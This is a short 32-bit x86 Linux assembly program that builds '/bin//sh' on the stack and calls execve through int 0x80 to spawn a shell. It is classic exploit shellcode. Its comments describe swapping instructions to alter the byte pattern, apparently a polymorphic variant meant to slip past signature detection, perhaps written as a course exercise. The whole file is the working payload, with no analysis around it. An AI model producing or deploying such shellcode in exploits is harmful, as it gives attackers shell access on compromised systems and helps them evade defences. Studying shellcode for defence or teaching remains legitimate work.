global _start
section .text

_start:

xor eax, eax ; zero out eax
mov al, 0xb ; use move instead of push and pop
cdq
push edx
push dword 0x68732f2f
push dword 0x6e69622f
mov ebx,esp
push 0x1                ; mixing the xor ecx,ecx
pop ecx
dec ecx
int 0x80

